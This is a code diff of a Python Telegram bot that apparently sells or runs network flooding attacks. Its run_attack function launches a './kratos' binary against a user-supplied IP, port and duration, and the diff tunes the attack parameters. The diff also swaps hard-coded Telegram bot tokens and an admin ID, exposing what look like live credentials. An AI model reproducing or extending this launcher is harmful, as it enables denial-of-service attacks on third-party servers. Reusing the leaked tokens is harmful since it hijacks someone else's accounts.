@@ -20,8 +20,8 @@ db = client['TEST']
 users_collection = db['VAMPIREXCHEATS']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7797531406:AAFms8VcTsZw00HC41tMK7OJwYOWE9pMD_I'
-ADMIN_USER_ID = 7474328522, 1942360454
+TELEGRAM_BOT_TOKEN = '8182540858:AAHYPHAbLXe8zr4V1bDIIh2NO6bGvSrJJ1Y'
+ADMIN_USER_ID = 7474328522
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -140,7 +140,7 @@ async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./kratos {ip} {port} {duration} 175 1430",
+            f"./kratos {ip} {port} {duration} 9 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
